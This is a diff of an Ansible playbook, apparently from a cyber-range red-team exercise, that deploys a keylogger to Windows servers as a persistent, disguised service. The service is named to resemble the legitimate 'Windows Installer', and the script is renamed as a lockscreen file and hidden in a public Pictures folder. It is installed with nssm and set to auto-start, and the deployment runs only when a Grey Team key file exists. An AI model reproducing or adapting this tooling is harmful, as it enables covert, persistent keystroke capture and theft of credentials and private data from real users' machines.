@@ -1,21 +1,50 @@
 ---
-- name: Deploy and run keylogger on Windows Server
+- name: Deploy and run keylogger as a Service on Windows Servers
   hosts: Windows
 
   vars:
-    source_path: ./keylogger.py
-    dest_path: C:\Users\applejack\AppData\Local\Packages\keylogger.py # destination folder is the same folder that the log file gets placed in
+    service_name: "Windows Install Service" # similar name to legit service "Windows Installer"
+    service_directory: "C:\\Users\\Public\\Pictures"
+    service_script: "{{ service_directory }}\\microsoft-windows-default-lockscreen.py" # destination folder is the same folder that the log file gets placed in
+    local_file: "/home/cyberrange/keylogger.py"
+    nssm_exe: "{{ service_directory }}\\nssm.exe"
+    local_nssm: "/home/cyberrange/nssm.exe"
+    greyteam_key: C:\\greyteam_key
   
   tasks:
+    - name: Check Grey Team key
+      stat:
+        path: "{{ greyteam_key }}"
+      register: key_check
 
-    # check gray team key
+    - block:
+        - name: Make sure the directory exists
+          ansible.windows.win_file:
+            path: "{{ service_directory }}"
+            state: directory
 
-    # copy script
-    - name: Copy Python script to Windows Servers
-      win_copy:
-        src: "{{ source_path }}"
-        dest_path: "{{ dest_path }}"
+        - name: Copy script over
+          ansible.windows.win_copy:
+            src: "{{ local_file }}"
+            dest: "{{ service_script }}"
 
-    # run script
-    - name: Run Python script on Windows Servers
-      win_command: "python {{ dest_path }}"
+        - name: Copy nssm over
+          ansible.windows.win_copy:
+            src: "{{ local_nssm }}"
+            dest: "{{ nssm_exe }}"
+
+        - name: Install service
+          ansible.windows.win_shell: |
+            & "{{ nssm_exe }}" install "{{ service_name }}" "{{ service_script }}"
+            & "{{ nssm_exe }}" set "{{ service_name }}" AppDirectory "{{ service_directory }}"
+
+        - name: Set service to auto start
+          ansible.windows.win_service:
+            name: "{{ service_name }}"
+            start_mode: auto
+
+        - name: Start Service
+          ansible.windows.win_service:
+            name: "{{ service_name }}"
+            state: started
+      when: key_check.stat.exists  
